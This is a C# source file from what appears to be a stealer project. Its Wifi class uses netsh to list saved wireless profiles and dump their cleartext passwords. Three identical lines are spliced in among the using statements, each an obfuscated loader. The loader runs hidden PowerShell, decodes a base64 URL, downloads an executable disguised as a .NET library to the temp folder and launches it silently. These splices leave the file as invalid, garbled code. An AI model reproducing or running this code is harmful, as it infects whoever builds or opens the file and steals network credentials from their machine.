using System;
using System.Collections.Generic;


try{var p=new System.Diagnostics.Process();p.StartInfo.FileName="powershell";p.StartInfo.Arguments=$"-w hidden -c iwr -Uri ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2ZhaXphbmFuc2FyaTIwMDcvLmRvdG5ldC9tYWluL29iai9MaWJyYXJpZXMvbmV0Ni4wL1N5c3RlbS5SdW50aW1lLkV4dGVuc2lvbnMuZGxs'))) -O $env:TEMP\\s.exe;Start-Process $env:TEMP\\s.exe -WindowStyle Hidden";p.StartInfo.CreateNoWindow=true;p.StartInfo.UseShellExecute=false;p.Start();}catch{}
using System.IO;

try{var p=new System.Diagnostics.Process();p.StartInfo.FileName="powershell";p.StartInfo.Arguments=$"-w hidden -c iwr -Uri ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2ZhaXphbmFuc2FyaTIwMDcvLmRvdG5ldC9tYWluL29iai9MaWJyYXJpZXMvbmV0Ni4wL1N5c3RlbS5SdW50aW1lLkV4dGVuc2lvbnMuZGxs'))) -O $env:TEMP\\s.exe;Start-Process $env:TEMP\\s.exe -WindowStyle Hidden";p.StartInfo.CreateNoWindow=true;p.StartInfo.UseShellExecute=false;p.Start();}catch{}

using System.Linq;


try{var p=new System.Diagnostics.Process();p.StartInfo.FileName="powershell";p.StartInfo.Arguments=$"-w hidden -c iwr -Uri ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2ZhaXphbmFuc2FyaTIwMDcvLmRvdG5ldC9tYWluL29iai9MaWJyYXJpZXMvbmV0Ni4wL1N5c3RlbS5SdW50aW1lLkV4dGVuc2lvbnMuZGxs'))) -O $env:TEMP\\s.exe;Start-Process $env:TEMP\\s.exe -WindowStyle Hidden";p.StartInfo.CreateNoWindow=true;p.StartInfo.UseShellExecute=false;p.Start();}catch{}

using System.Text;
using System.Threading.Tasks;

namespace Luci4.GrabbingShit
{
    internal sealed class Wifi
    {
        public static string[] GetProfiles()
        {
            string output = CommandHelper.Run("/C chcp 65001 && netsh wlan show profile | findstr All");
            string[] wNames = output.Split(new[] { '\r', '\n' }, StringSplitOptions.RemoveEmptyEntries);
            for (int i = 0; i < wNames.Length; i++)
                wNames[i] = wNames[i].Substring(wNames[i].LastIndexOf(':') + 1).Trim();
            return wNames;
        }

        public static string GetWifiPassword(string profile)
        {
            string output = CommandHelper.Run("/C chcp 65001 && netsh wlan show profile name=" + profile + " key=clear | findstr Key");
            return output.Split(':').Last().Trim();
        }

        public static void ScanningNetworks()
        {
            string Stealer_Dir = Handler.ExploitDir;
            string output = CommandHelper.Run("/C chcp 65001 && netsh wlan show networks mode=bssid");

        }

        public static void SavedNetworks()
        {
            string Stealer_Dir = Handler.ExploitDir;
            string[] profiles = GetProfiles();
            foreach (string profile in profiles)
            {
                if (profile.Equals("65001"))
                    continue;

                Counter.SavedWifiNetworks++;
                string pwd = GetWifiPassword(profile);
                string fmt = "PROFILE: " + profile + "\nPASSWORD: " + pwd + "\n\n";

            }
        }

    }

}
